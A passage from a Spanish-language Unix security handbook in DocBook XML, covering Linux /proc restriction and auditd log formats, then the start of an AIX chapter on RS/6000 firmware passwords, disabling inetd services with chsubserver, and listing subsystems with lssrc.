     ciertos ataques de Data Spoo&#xFB01;ng.
     </para></listitem>
     <listitem>
     <!--l. 1053--><para>/proc restringido
     <!--br/-->Esta es quiz&#x00E1;s la caracter&#x02CA;&#x0131;stica m&#x00E1;s &#x00FA;til de este parche, aparte de la m&#x00E1;s visible para el usuario
     normal. Permite que los usuarios no tengan un acceso completo al directorio /proc/ (que
     recordemos permite un acceso a estructuras de datos del n&#x00FA;cleo, como la tabla de procesos,
     desde el espacio de usuario) a no ser que se encuentren en un determinado grupo con el nivel
     de privilegio su&#xFB01;ciente. De esta forma se consigue un aumento espectacular en la privacidad
     del sistema, ya que por ejemplo los usuarios s&#x00F3;lo podr&#x00E1;n ver sus procesos al ejecutar un ps aux,

     y tampoco tendr&#x00E1;n acceso al estado de las conexiones de red v&#x02CA;&#x0131;a netstat; as&#x02CA;&#x0131;, &#x00F3;rdenes como ps
     o top s&#x00F3;lo muestran informaci&#x00F3;n relativa a los procesos de qui&#x00E9;n las ejecuta, a no ser que esta
     persona sea el administrador o un usuario perteneciente al grupo 0.</para></listitem></itemizedlist>
<!--l. 1067--><para>
  </para></section><!--end subsubsection--><!--l. 1067--><section 
role="subsubsection"><title><anchor 
   id="x1-15700010.6.3"  ></anchor>Auditd</title>
<!--l. 1068--><para>  El demonio auditd permite al administrador de un sistema Linux recibir la informaci&#x00F3;n de auditor&#x02CA;&#x0131;a de
seguridad que el n&#x00FA;cleo genera, a trav&#x00E9;s del &#xFB01;chero /proc/audit, &#xFB01;ltrarla y almacenarla en &#xFB01;cheros. Esta
informaci&#x00F3;n tiene el siguiente formato:
     </para><!--l. 1073--><para>AUDIT_CONNECT pid ruid shost sport dhost dport
     <!--br/-->Conexi&#x00F3;n desde la m&#x00E1;quina al host remoto dhost.
     <!--br/-->AUDIT_ACCEPT pid ruid shost sport dhost dport
     <!--br/-->Conexi&#x00F3;n desde el host remoto dhost a la m&#x00E1;quina.
     <!--br/-->AUDIT_LISTEN pid ruid shost sport
     <!--br/-->El puerto indicado est&#x00E1; esperando peticiones de servicio.
     <!--br/-->AUDIT_OPEN pid ruid file
     <!--br/-->Se ha abierto el &#xFB01;chero file.
     <!--br/-->AUDIT_SETUID pid old_ruid ruid euid
     <!--br/-->Se ha llamado con &#x00E9;xito a setuid(), modi&#xFB01;cando el UID de ruid a euid.
     <!--br/-->AUDIT_EXEC pid ruid file
     <!--br/-->Se ha ejecutado el &#xFB01;chero file.
     <!--br/-->AUDIT_MODINIT pid ruid file
     <!--br/-->Se ha insertado en el kernel el m&#x00F3;dulo file.
</para><!--l. 1089--><para>Al leer la informaci&#x00F3;n de /proc/audit, el demonio auditd lee las reglas de &#xFB01;ltrado del &#xFB01;chero
/etc/security/audit.conf, comparando los &#xFB02;ags, PID y RUID (Real User IDenti&#xFB01;er) recibidos con cada
una de las reglas del archivo de con&#xFB01;guraci&#x00F3;n hasta encontrar la apropiada para tratar el evento. Una vez
que el demonio auditd ha encontrado el &#xFB01;chero donde almacenar la informaci&#x00F3;n recibida, la guarda en &#x00E9;l con
un formato legible.



</para><!--l. 1--><para>

  </para></section><!--end subsubsection--></section><!--end subsection--></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-15800011"  ></anchor>AIX</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">11.1</abbrev><anchor 
   id="x1-15900011.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 3--><para>  AIX (Advanced Interactive eXecutive) es la versi&#x00F3;n de Unix desarrollada y mantenida desde hace m&#x00E1;s de
diez a~nos por IBM; sus or&#x02CA;&#x0131;genes provienen de IBM RT System, de &#xFB01;nales de los ochenta, y se ejecuta en
las plataformas RS/6000, basadas en chips RISC PowerPC similares al utilizados por algunos Macintosh m&#x00E1;s
o menos modernos. Este operativo, mezcla de BSD y System V (se suele decir que no es ni uno ni otro) es
el que m&#x00E1;s caracter&#x02CA;&#x0131;sticas propietarias incorpora, caracter&#x02CA;&#x0131;sticas que no se encuentran en ninguna otra
versi&#x00F3;n de Unix, por lo que a cualquier administrador le costar&#x00E1; m&#x00E1;s adaptarse a AIX que a otros Unices. No
obstante, en favor de IBM hay que decir que dispone de un excelente asistente para realizar todo
tipo de tareas denominado SMIT (System Management Interface Tool, tambi&#x00E9;n ejecutado como
smitty en modo consola): aunque por supuesto cualquier tarea tambi&#x00E9;n se puede ejecutar desde
la l&#x02CA;&#x0131;nea de comandos, esto generalmente no se hace con las &#x00F3;rdenes habituales de Unix, por
lo que SMIT es una herramienta indispensable para el administrador de la m&#x00E1;quina. AIX, a
pesar de que en un principio pueda parecer el Unix m&#x00E1;s arcaico &#x2013; y nadie niega que lo sea &#x2013;
es un entorno de trabajo &#xFB01;able y sobre todo extremadamente estable, e incluso incorpora
caracter&#x02CA;&#x0131;sticas (tanto de seguridad como de otros aspectos) que ya quisieran para s&#x02CA;&#x0131; otros sistemas
Unix.
<!--br/-->
<!--br/-->El hecho de que muchas tareas no se realicen en AIX de la misma forma en que se llevan a cabo en el resto
de Unices es en parte debido al ODM (Object Data Manager); a diferencia de Solaris o Linux, en AIX
debemos tener presente en todo momento que vi no es una herramienta para administrar el sistema,
ya que los cl&#x00E1;sicos &#xFB01;cheros de con&#xFB01;guraci&#x00F3;n ASCII han sido sustituidos por archivos binarios,
bases de datos que mantienen la con&#xFB01;guraci&#x00F3;n del sistema (aspectos como los dispositivos, los
recursos del entorno, o el subsistema de comunicaciones de AIX) de forma m&#x00E1;s robusta, segura y
portable que los simples &#xFB01;cheros de texto, al menos en opini&#x00F3;n de los desarrolladores de IBM
(<citation>[?]</citation>).
<!--br/-->
<!--br/-->IBM mantiene en Internet un excelente repositorio de documentaci&#x00F3;n, principalmente los denominados
RedBooks, completos manuales sobre casi cualquier tema relacionado con AIX &#x2013; y otros productos de la
compa~n&#x02CA;&#x0131;a &#x2013; que podamos imaginar. Est&#x00E1;n disponibles en la direcci&#x00F3;n http://www.redbooks.ibm.com/, y
algunos de ellos son una herramienta imprescindible para cualquier administrador de sistemas. Por
supuesto, tambi&#x00E9;n es muy recomendable instalar las p&#x00E1;ginas del manual on&#x2013;line de AIX, algo que
incomprensiblemente no se hace por defecto en una instalaci&#x00F3;n est&#x00E1;ndar, y utilizar SMIT para ejecutar
cualquier tarea que desde l&#x02CA;&#x0131;nea de &#x00F3;rdenes dudemos de c&#x00F3;mo hacer.
<!--br/-->
<!--br/-->En este cap&#x02CA;&#x0131;tulo hablaremos de aspectos de la seguridad casi exclusivos de AIX; al ser este sistema
probablemente el Unix m&#x00E1;s cerrado de todos, lo que veamos aqu&#x02CA;&#x0131; dif&#x02CA;&#x0131;cilmente ser&#x00E1; extrapolable &#x2013; en la
mayor&#x02CA;&#x0131;a de casos &#x2013; a otros entornos como Solaris o HP&#x2013;UX. En cualquier caso, es necesario para un
administrador conocer los aspectos de AIX que le con&#xFB01;eren su enorme robustez, tanto en lo referente a
seguridad como en cualquier otra faceta gen&#x00E9;rica del sistema.
  </para></section><!--end section--><!--l. 50--><section 
role="section"><title><abbrev role="title-mark">11.2</abbrev><anchor 
   id="x1-16000011.2"  ></anchor>Seguridad f&#x02CA;&#x0131;sica en RS/6000</title>
<!--l. 51--><para>  El &#xFB01;rmware de los sistemas RS/6000 provee de tres modos de protecci&#x00F3;n f&#x02CA;&#x0131;sica (<citation>[?]</citation>), en cierta forma
similares a las que ofrecen las estaciones SPARC que comentamos al hablar de Solaris. El primero de ellos,
denominado POP (Power&#x2013;On Password) es el equivalente al modo &#x2018;full-secure&#x2019; de SPARC, y como &#x00E9;ste
impide el arranque del sistema si antes no se ha introducido la contrase~na determinada como POP; por
supuesto, esto evita tareas como la plani&#xFB01;caci&#x00F3;n de reinicios autom&#x00E1;ticos, por lo que en muchas
ocasiones no compensa el nivel de seguridad con el de funcionalidad. Por eso existe un segundo
modo de protecci&#x00F3;n denominado Unattended start mode que permite arrancar al sistema de
su dispositivo por defecto sin necesidad de que un operador teclee la contrase~na POP para
ello.
<!--br/-->
<!--br/-->En el modo &#x2018;desatendido&#x2019; el sistema arranca con normalidad desde el dispositivo especi&#xFB01;cado por defecto
sin necesidad de ninguna clave POP (a pesar de que esta contrase~na tenga que haber sido de&#xFB01;nida con

anterioridad); el sistema arranca, pero la diferencia con el modo normal es que el controlador de teclado
permanece bloqueado hasta el el password POP es introducido. De esta forma se consigue que la
m&#x00E1;quina proporcione todos sus servicios (el arranque es completo) pero que, si alguien quiere
acceder a la misma desde consola, est&#x00E9; obligado a introducir la contrase~na POP previamente
de&#xFB01;nida.
<!--br/-->
<!--br/-->Aparte del password POP, en las m&#x00E1;quinas RS/6000 puede establecerse una segunda contrase~na denominada
PAP (Privileged Access Password) o Supervisory Password, que protege el arranque del SMS (System
Management Services), un &#xFB01;rmware que proporciona al administrador de la m&#x00E1;quina ciertas utilidades de
con&#xFB01;guraci&#x00F3;n de bajo nivel; el SMS es accesible en un determinado punto de la secuencia de
arranque de la m&#x00E1;quina, en concreto cuando el display marca &#x2018;FF1&#x2019; y se pulsa una cierta tecla
(generalmente &#x2018;1&#x2019; en terminales de texto o &#x2018;F1&#x2019; en terminales gr&#x00E1;&#xFB01;cas), y desde sus men&#x00FA;s se puede
actualizar el propio &#xFB01;rmware o cambiar el dispositivo de arranque, por poner s&#x00F3;lo un par de
ejemplos. Si la contrase~na PAP est&#x00E1; habilitada se restringe el acceso al SMS, evitando que un
atacante con acceso f&#x02CA;&#x0131;sico al equipo puede modi&#xFB01;car par&#x00E1;metros de la m&#x00E1;quina vitales para nuestra
seguridad.
<!--br/-->
<!--br/-->Es importante establecer un password para proteger el SMS: si un pirata consigue acceso al mismo, ni tan
siquiera importar&#x00E1; si hemos de&#xFB01;nido o no una contrase~na POP, ya que podr&#x00E1; deshabilitarla o incluso
cambiarla desde el SMS; el problema surge si la clave de nuestro &#xFB01;rmware se pierde, ya que en ese caso
necesitar&#x02CA;&#x0131;amos abrir el equipo y quitarle su bater&#x02CA;&#x0131;a, perdiendo en este caso toda la con&#xFB01;guraci&#x00F3;n
almacenada en la NVRAM.
<!--br/-->
<!--br/-->Desde la l&#x02CA;&#x0131;nea de &#x00F3;rdenes de un sistema AIX podemos ejecutar ciertos mandatos que nos van a permitir
tanto visualizar el valor de par&#x00E1;metros del &#xFB01;rmware como modi&#xFB01;car dicho valor; lamentablemente no
tenemos un interfaz tan uniforme como en Solaris, donde a trav&#x00E9;s de la orden eeprom leemos y modi&#xFB01;camos
la informaci&#x00F3;n de la NVRAM, sino que en AIX tenemos que utilizar diferentes &#x00F3;rdenes para interactuar con el
&#xFB01;rmware de la m&#x00E1;quina. Por ejemplo, mediante un comando como bootlist podemos consultar y modi&#xFB01;car
la lista de dispositivos de arranque del sistema, y mediante lscfg obtener la versi&#x00F3;n del &#xFB01;rmware instalado
en la m&#x00E1;quina:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;bootlist&#x00A0;-m&#x00A0;normal&#x00A0;-o
&#x00A0;hdisk0
&#x00A0;fd0
&#x00A0;cd0
&#x00A0;ent2
&#x00A0;bruja:/#
</literallayout>
<!--l. 116--><para>
  </para></section><!--end section--><!--l. 116--><section 
role="section"><title><abbrev role="title-mark">11.3</abbrev><anchor 
   id="x1-16100011.3"  ></anchor>Servicios de red</title>
<!--l. 117--><para>  Como en el resto de entornos Unix, en AIX es vital garantizar la seguridad de los servicios de red de
la m&#x00E1;quina para conseguir un entorno de trabajo &#xFB01;able en su globalidad; no obstante, este
operativo provee de una serie de herramientas que otros sistemas no proporcionan y que facilitan
enormemente el trabajo del administrador: es importante acostumbrarse a su manejo (recordemos que
en AIX vi no es una herramienta administrativa) a trav&#x00E9;s de SMIT y, mucho mejor, desde
l&#x02CA;&#x0131;nea de &#x00F3;rdenes. Por poner un ejemplo, si a un administrador de un entorno Solaris, Linux
o HP-UX le preguntamos c&#x00F3;mo eliminar&#x02CA;&#x0131;a el servicio chargen en una m&#x00E1;quina, la respuesta
ser&#x02CA;&#x0131;a siempre la misma: editando /etc/inetd.conf, comentando la l&#x02CA;&#x0131;nea correspondiente
con una almohadilla (&#x2018;#&#x2019;) y reiniciando el demonio inetd envi&#x00E1;ndole la se~nal SIGHUP; si le
preguntamos lo mismo al root de una m&#x00E1;quina AIX, lo m&#x00E1;s probable (aunque podr&#x02CA;&#x0131;a hacerlo
de la forma anterior) es que utilice una orden como chsubserver, en un proceso similar al
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;grep&#x00A0;chargen&#x00A0;/etc/inetd.conf
&#x00A0;chargen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;internal
&#x00A0;chargen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;dgram&#x00A0;&#x00A0;&#x00A0;udp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;wait&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;internal
&#x00A0;bruja:/#&#x00A0;chsubserver&#x00A0;-d&#x00A0;-v&#x00A0;chargen&#x00A0;-p&#x00A0;udp
&#x00A0;bruja:/#&#x00A0;chsubserver&#x00A0;-d&#x00A0;-v&#x00A0;chargen&#x00A0;-p&#x00A0;tcp
&#x00A0;bruja:/#&#x00A0;grep&#x00A0;chargen&#x00A0;/etc/inetd.conf
&#x00A0;#chargen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;internal
&#x00A0;#chargen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;dgram&#x00A0;&#x00A0;&#x00A0;udp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;wait&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;internal
&#x00A0;bruja:/#&#x00A0;refresh&#x00A0;-s&#x00A0;inetd
&#x00A0;bruja:/#
</literallayout>
<!--l. 146--><para>En AIX los subsistemas de red son gestionados por el Controlador de Recursos del Sistema (SRC, System
Resource Controller), un software que proporciona comandos e interfaces uniformes para crear y controlar
subsistemas (<citation>[?]</citation>), que no son m&#x00E1;s que programas o procesos (o combinaciones de los mismos) capaces de
operar de forma independiente o a trav&#x00E9;s de un controlador, algo que es m&#x00E1;s o menos equivalente a lo que
todos conocemos como &#x2018;demonio&#x2019; en cualquier Unix; podemos ejecutar la orden &#x2018;lssrc -a&#x2019; para listar los
subsistemas de nuestra m&#x00E1;quina AIX:

     </para><literallayout role="verbatim">
&#x00A0;bruja:/#&#x00A0;lssrc&#x00A0;-a
&#x00A0;Subsystem&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Group&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;PID&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Status
&#x00A0;&#x00A0;portmap&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;portmap&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;5684&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;inetd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;7770&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;xntpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;6352&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;automountd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;autofs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;6056&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;hats&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hats&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;9876&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;hags&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hags&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;8494&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;hagsglsm&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hags&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;9370&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;haem&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;haem&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;6694&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;haemaixos&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;haem&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;10662&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;pman&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pman&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;11372&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;pmanrm&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;pman&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;12130&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;sysctld&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;11174&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;snmpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;15520&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;sendmail&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mail&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;16628&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;dpid2&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;16106&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;fs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;19612&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;biod&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nfs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;19874&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;rpc.statd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nfs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;20644&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;qdaemon&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;spooler&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;15750&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;writesrv&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;spooler&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;19366&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;clstrmgr&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cluster&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32706&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;clsmuxpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cluster&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;42048&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;nfsd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nfs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;31168&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;rpc.mountd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nfs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;42904&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;rpc.lockd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nfs&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32004&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;tftpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;7586&#x00A0;&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;syslogd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ras&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;31852&#x00A0;&#x00A0;&#x00A0;active
&#x00A0;&#x00A0;lpd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;spooler&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;clvmd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;gated&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;named&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
&#x00A0;&#x00A0;routed&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tcpip&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;inoperative
